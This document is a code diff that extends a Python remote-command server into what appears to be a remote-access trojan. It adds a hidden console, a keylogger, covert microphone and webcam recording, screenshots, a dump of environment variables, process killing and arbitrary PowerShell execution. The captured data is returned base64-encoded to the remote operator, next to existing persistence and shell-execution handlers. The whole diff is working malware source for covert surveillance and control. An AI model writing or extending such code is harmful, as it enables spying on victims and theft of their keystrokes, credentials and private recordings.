@@ -12,7 +12,22 @@ import subprocess
 import urllib.request
 import zipfile
 import io
+import threading
+import platform
+import psutil
+import base64
+from PIL import ImageGrab
+import threading
+import platform
+import psutil
 import time
+
+# Hide console window if running with python (to avoid CMD window)
+try:
+    import ctypes
+    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+except Exception:
+    pass
 
 # Load environment variables from .env
 load_dotenv()
@@ -69,6 +84,12 @@ def init_db():
     conn.close()
 
 init_db()
+
+# Global variables for keylogger and media recording
+keylog_thread = None
+keylog_running = False
+audio_process = None
+video_process = None
 
 # Helper to log command execution
 def log_command(command: str, output: str, success: bool):
@@ -152,6 +173,142 @@ async def handle_command(request):
             return web.json_response({"command": command, "error": f"Download error: {e}"})
 
     # ----- End of new command handling -----
+    # Record command: start/stop audio/video recording
+    if command.lower().startswith("record "):
+        parts = command.split()
+        if len(parts) >= 3 and parts[1].lower() == "start":
+            mode = parts[2].lower()
+            if mode == "audio":
+                if audio_process is None:
+                    audio_file = "audio.wav"
+                    audio_cmd = f'ffmpeg -y -f dshow -i audio="Microphone (Realtek Audio)" -vn {audio_file}'
+                    audio_process = subprocess.Popen(audio_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    return web.json_response({"command": command, "output": "Audio recording started"})
+                else:
+                    return web.json_response({"command": command, "output": "Audio recording already in progress"})
+            elif mode == "video":
+                if video_process is None:
+                    video_file = "video.mp4"
+                    video_cmd = f'ffmpeg -y -f dshow -i video="Integrated Camera" -an {video_file}'
+                    video_process = subprocess.Popen(video_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    return web.json_response({"command": command, "output": "Video recording started"})
+                else:
+                    return web.json_response({"command": command, "output": "Video recording already in progress"})
+            elif mode == "both":
+                msgs = []
+                if audio_process is None:
+                    audio_file = "audio.wav"
+                    audio_cmd = f'ffmpeg -y -f dshow -i audio="Microphone (Realtek Audio)" -vn {audio_file}'
+                    audio_process = subprocess.Popen(audio_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    msgs.append("audio")
+                else:
+                    msgs.append("audio (already)")
+                if video_process is None:
+                    video_file = "video.mp4"
+                    video_cmd = f'ffmpeg -y -f dshow -i video="Integrated Camera" -an {video_file}'
+                    video_process = subprocess.Popen(video_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+                    msgs.append("video")
+                else:
+                    msgs.append("video (already)")
+                return web.json_response({"command": command, "output": f"Started recording: {', '.join(msgs)}"})
+            else:
+                return web.json_response({"command": command, "error": "Invalid record mode. Use audio, video, or both"})
+        elif len(parts) >= 2 and parts[1].lower() == "stop":
+            stopped = []
+            if audio_process:
+                audio_process.terminate()
+                audio_process = None
+                stopped.append("audio")
+            if video_process:
+                video_process.terminate()
+                video_process = None
+                stopped.append("video")
+            if not stopped:
+                return web.json_response({"command": command, "output": "No recording was active"})
+            files = {}
+            if "audio" in stopped and os.path.isfile("audio.wav"):
+                with open("audio.wav", "rb") as f:
+                    files["audio"] = {"name": "audio.wav", "data": base64.b64encode(f.read()).decode()}
+            if "video" in stopped and os.path.isfile("video.mp4"):
+                with open("video.mp4", "rb") as f:
+                    files["video"] = {"name": "video.mp4", "data": base64.b64encode(f.read()).decode()}
+            resp = {"command": command, "output": f"Recording stopped: {', '.join(stopped)}"}
+            if files:
+                resp["files"] = files
+            return web.json_response(resp)
+        else:
+            return web.json_response({"command": command, "error": "Invalid record command syntax"})
+
+    # Keylogger command: start/stop keylogging
+    if command.lower().startswith("keylog "):
+        arg = command.split()[1].lower() if len(command.split()) > 1 else ""
+        global keylog_thread, keylog_running
+        if arg == "start":
+            if not keylog_running:
+                def keylog_worker():
+                    import keyboard
+                    with open("keylog.txt", "a") as f:
+                        while keylog_running:
+                            event = keyboard.read_event()
+                            if event.event_type == keyboard.KEY_DOWN:
+                                f.write(event.name + "\n")
+                                f.flush()
+                keylog_running = True
+                keylog_thread = threading.Thread(target=keylog_worker, daemon=True)
+                keylog_thread.start()
+                return web.json_response({"command": command, "output": "Keylogger started"})
+            else:
+                return web.json_response({"command": command, "output": "Keylogger already running"})
+        elif arg == "stop":
+            if keylog_running:
+                keylog_running = False
+                keylog_thread.join()
+                return web.json_response({"command": command, "output": "Keylogger stopped"})
+            else:
+                return web.json_response({"command": command, "output": "Keylogger not running"})
+        else:
+            return web.json_response({"command": command, "error": "Invalid keylog argument. Use start/stop"})
+
+    # System info command
+    if command.lower() == "sysinfo":
+        info = {
+            "platform": platform.system(),
+            "platform_release": platform.release(),
+            "platform_version": platform.version(),
+            "architecture": platform.machine(),
+            "hostname": platform.node(),
+        }
+        return web.json_response({"command": command, "output": info})
+
+    # List processes command
+    if command.lower() == "list_processes":
+        processes = []
+        for proc in psutil.process_iter(['pid', 'name', 'username']):
+            processes.append(proc.info)
+        return web.json_response({"command": command, "output": processes})
+
+    # Kill process command
+    if command.lower().startswith("kill_process "):
+        parts = command.split()
+        if len(parts) != 2:
+            return web.json_response({"command": command, "error": "Usage: kill_process <pid>"})
+        try:
+            pid = int(parts[1])
+            os.kill(pid, 9)
+            return web.json_response({"command": command, "output": f"Killed process {pid}"})
+        except Exception as e:
+            return web.json_response({"command": command, "error": str(e)})
+
+    # List directory command
+    if command.lower().startswith("list_dir "):
+        path = command[9:].strip()
+        if not os.path.isdir(path):
+            return web.json_response({"command": command, "error": f"Not a directory: {path}"})
+        try:
+            files = os.listdir(path)
+            return web.json_response({"command": command, "output": files})
+        except Exception as e:
+            return web.json_response({"command": command, "error": str(e)})
 
     # Persistence handling
     if command.lower().startswith("persistence "):
@@ -190,6 +347,53 @@ async def handle_command(request):
                 return web.json_response({"command": command, "success": False, "output": "Invalid argument. Use on/off"})
         except Exception as e:
             return web.json_response({"command": command, "success": False, "output": f"Error: {e}"})
+
+    # New command: get external IP address
+    if command.lower() == "ipinfo":
+        try:
+            with urllib.request.urlopen('https://api.ipify.org') as resp:
+                external_ip = resp.read().decode().strip()
+            return web.json_response({"command": command, "output": external_ip})
+        except Exception as e:
+            return web.json_response({"command": command, "error": str(e)})
+
+    # New command: screenshot - capture screen and return base64 image
+    if command.lower() == "screenshot":
+        try:
+            img = ImageGrab.grab()
+            import io, base64
+            buf = io.BytesIO()
+            img.save(buf, format='PNG')
+            b64 = base64.b64encode(buf.getvalue()).decode()
+            return web.json_response({"command": command, "output": "Screenshot captured", "file": {"name": "screenshot.png", "data": b64}})
+        except Exception as e:
+            return web.json_response({"command": command, "error": str(e)})
+
+    # New command: env - return environment variables
+    if command.lower() == "env":
+        try:
+            return web.json_response({"command": command, "output": dict(os.environ)})
+        except Exception as e:
+            return web.json_response({"command": command, "error": str(e)})
+
+    # New command: run_ps - execute PowerShell command (Windows only)
+    if command.lower().startswith("run_ps "):
+        ps_cmd = command[7:].strip()
+        try:
+            completed = subprocess.run(["powershell", "-Command", ps_cmd], capture_output=True, text=True, shell=True)
+            output = completed.stdout + completed.stderr
+            success = completed.returncode == 0
+            return web.json_response({"command": command, "success": success, "output": output})
+        except Exception as e:
+            return web.json_response({"command": command, "error": str(e)})
+
+    # New command: list_services - enumerate Windows services
+    if command.lower() == "list_services":
+        try:
+            completed = subprocess.run(["sc", "query", "state=", "all"], capture_output=True, text=True, shell=True)
+            return web.json_response({"command": command, "output": completed.stdout})
+        except Exception as e:
+            return web.json_response({"command": command, "error": str(e)})
 
     # Execute the command on the host system
     try:
